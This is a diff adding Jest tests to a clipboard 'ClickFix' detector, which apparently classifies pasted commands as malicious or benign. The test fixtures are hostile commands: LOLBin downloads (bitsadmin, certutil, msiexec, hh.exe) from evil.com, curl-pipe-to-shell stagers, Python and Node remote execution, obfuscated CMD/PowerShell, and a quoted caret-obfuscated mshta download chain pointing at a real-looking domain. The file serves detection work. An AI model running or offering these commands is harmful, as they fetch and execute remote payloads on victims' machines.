@@ -92,6 +92,154 @@ describe('ClickFix Detector', () => {
       expect(result.indicator.category).toBe('execution');
       expect(result.indicator.confidence).toBe('high');
     });
+
+    test('detects Windows Script Host execution (medium confidence)', () => {
+      const payload = 'wscript //e:jscript //B C:\\Users\\Public\\stage.js';
+      const result = analyzeClipboard(payload);
+      expect(result.status).toBe('detected');
+      expect(result.indicator.label).toBe('Windows Script Host execution');
+      expect(result.indicator.category).toBe('execution');
+      expect(result.indicator.confidence).toBe('medium');
+    });
+
+    test('detects bitsadmin remote download via /transfer (high confidence)', () => {
+      const payload = 'bitsadmin /transfer myJob /download /priority high https://evil.com/payload.exe C:\\Users\\Public\\payload.exe';
+      const result = analyzeClipboard(payload);
+      expect(result.status).toBe('detected');
+      expect(result.indicator.label).toBe('bitsadmin remote download');
+      expect(result.indicator.category).toBe('execution');
+      expect(result.indicator.confidence).toBe('high');
+    });
+
+    test('detects certutil remote download via -urlcache (high confidence)', () => {
+      const payload = 'certutil -urlcache -split -f https://evil.com/payload.exe C:\\Users\\Public\\payload.exe';
+      const result = analyzeClipboard(payload);
+      expect(result.status).toBe('detected');
+      expect(result.indicator.label).toBe('certutil remote download');
+      expect(result.indicator.category).toBe('execution');
+      expect(result.indicator.confidence).toBe('high');
+    });
+
+    test('detects certutil payload decode (medium confidence)', () => {
+      const payload = 'certutil -decode C:\\Users\\Public\\encoded.b64 C:\\Users\\Public\\payload.exe';
+      const result = analyzeClipboard(payload);
+      expect(result.status).toBe('detected');
+      expect(result.indicator.label).toBe('certutil payload decode');
+      expect(result.indicator.category).toBe('obfuscation');
+      expect(result.indicator.confidence).toBe('medium');
+    });
+
+    test('detects msiexec remote install (high confidence)', () => {
+      const payload = 'msiexec /quiet /i https://evil.com/install.msi';
+      const result = analyzeClipboard(payload);
+      expect(result.status).toBe('detected');
+      expect(result.indicator.label).toBe('msiexec remote install');
+      expect(result.indicator.category).toBe('execution');
+      expect(result.indicator.confidence).toBe('high');
+    });
+
+    test('detects hh.exe remote payload (high confidence)', () => {
+      const payload = 'hh.exe https://evil.com/payload.chm';
+      const result = analyzeClipboard(payload);
+      expect(result.status).toBe('detected');
+      expect(result.indicator.label).toBe('hh.exe remote payload');
+      expect(result.indicator.category).toBe('execution');
+      expect(result.indicator.confidence).toBe('high');
+    });
+
+    test('detects PowerShell clipboard execution (high confidence)', () => {
+      const payload = '$repvar = (Get-Clipboard); set-clipboard; $repvar | iex';
+      const result = analyzeClipboard(payload);
+      expect(result.status).toBe('detected');
+      expect(result.indicator.label).toBe('PowerShell clipboard execution');
+
+    });
+
+    test('detects PowerShell base64 decoding (high confidence)', () => {
+      const payload = '[System.Convert]::FromBase64String("cGF5bG9hZA==")';
+      const result = analyzeClipboard(payload);
+      expect(result.status).toBe('detected');
+      expect(result.indicator.label).toBe('PowerShell Base64 decoding');
+    });
+
+    test('detects macOS pbpaste pipeline (high confidence)', () => {
+      const payload = 'pbpaste | bash';
+      const result = analyzeClipboard(payload);
+      expect(result.status).toBe('detected');
+      expect(result.indicator.label).toBe('macOS clipboard pipe execution');
+    });
+
+    test('detects macOS pbpaste eval (high confidence)', () => {
+      const payload = 'eval "$(pbpaste)"';
+      const result = analyzeClipboard(payload);
+      expect(result.status).toBe('detected');
+      expect(result.indicator.label).toBe('macOS clipboard pipe execution');
+    });
+
+    test('detects macOS AppleScript execution (high confidence)', () => {
+      const payload = 'osascript -e \'do shell script "curl https://evil.com/stager | bash"\'';
+      const result = analyzeClipboard(payload);
+      expect(result.status).toBe('detected');
+      expect(result.indicator.label).toBe('macOS AppleScript execution');
+    });
+
+    test('detects obfuscated pipe-execute (high confidence)', () => {
+      const payload = 'curl -s https://evil.com/payload.txt | base64 -d | sh';
+      const result = analyzeClipboard(payload);
+      expect(result.status).toBe('detected');
+      expect(result.indicator.label).toBe('Obfuscated pipe-execute');
+    });
+
+    test('detects Python inline remote/encoded execution (high confidence)', () => {
+      const payload = 'python3 -c "import urllib.request; exec(urllib.request.urlopen(\'http://evil.com\').read())"';
+      const result = analyzeClipboard(payload);
+      expect(result.status).toBe('detected');
+      expect(result.indicator.label).toBe('Python remote/encoded execution');
+    });
+
+    test('detects Node.js inline code execution (high confidence)', () => {
+      const payload = 'node -e "require(\'child_process\').exec(\'curl http://evil.com\')"';
+      const result = analyzeClipboard(payload);
+      expect(result.status).toBe('detected');
+      expect(result.indicator.label).toBe('Node.js code execution');
+    });
+
+    test('detects CMD caret obfuscation (high confidence)', () => {
+      const payload = 's^t^a^r^t cmd /c ^c^u^r^l^ http://evil.com';
+      const result = analyzeClipboard(payload);
+      expect(result.status).toBe('detected');
+      expect(result.indicator.label).toBe('CMD caret obfuscation');
+    });
+
+    test('detects PowerShell backtick obfuscation (high confidence)', () => {
+      const payload = 'p`o`w`e`r`s`h`e`l`l -c "echo 1"';
+      const result = analyzeClipboard(payload);
+      expect(result.status).toBe('detected');
+      expect(result.indicator.label).toBe('PowerShell backtick obfuscation');
+    });
+
+    test('detects %COMSPEC% command execution (medium confidence)', () => {
+      const payload = '%COMSPEC% /c echo 1';
+      const result = analyzeClipboard(payload);
+      expect(result.status).toBe('detected');
+      expect(result.indicator.label).toBe('cmd /c execution');
+    });
+
+    test('detects staged download-and-execute chain (high confidence)', () => {
+      const payload = 'curl -sLo file.hta http://evil.com/p && mshta file.hta';
+      const result = analyzeClipboard(payload);
+      expect(result.status).toBe('detected');
+      expect(result.indicator.label).toBe('Download chain execution');
+    });
+
+    test('detects de-obfuscated commands through normalization', () => {
+      // The Discord payload has carets and %COMSPEC% and curl && mshta
+      const payload = '%COMSPEC% /c s^t^a^r^t "" /min %COMSPEC% /c "(for /f \\"delims=\\" %w in (\'e^c^h^o %LocalAppData%\\Gt.max\') do ^c^u^r^l^ -skLo \\"%w\\" modernanchorengine.com/ps && ^m^s^h^t^a^ \\"%w\\")"';
+      const result = analyzeClipboard(payload);
+      expect(result.status).toBe('detected');
+      // Should match CMD caret obfuscation first, and normalized command contents
+      expect(result.indicator.label).toBe('CMD caret obfuscation');
+    });
   });
 
   describe('analyzeClipboard - benign inputs', () => {
@@ -127,6 +275,20 @@ describe('ClickFix Detector', () => {
 
       expect(result.status).toBe('not-detected');
       expect(result.indicator).toBeNull();
+    });
+
+    test('allows benign plain-text installers (whitelisted domains)', () => {
+      const benignHomebrew = 'curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh | bash';
+      const resultHomebrew = analyzeClipboard(benignHomebrew);
+      expect(resultHomebrew.status).toBe('not-detected');
+
+      const benignDocker = 'curl -sSL https://get.docker.com | sh';
+      const resultDocker = analyzeClipboard(benignDocker);
+      expect(resultDocker.status).toBe('not-detected');
+
+      const benignRustup = 'curl --proto "=https" --tlsv1.2 -sSf https://sh.rustup.rs | sh';
+      const resultRustup = analyzeClipboard(benignRustup);
+      expect(resultRustup.status).toBe('not-detected');
     });
   });
 
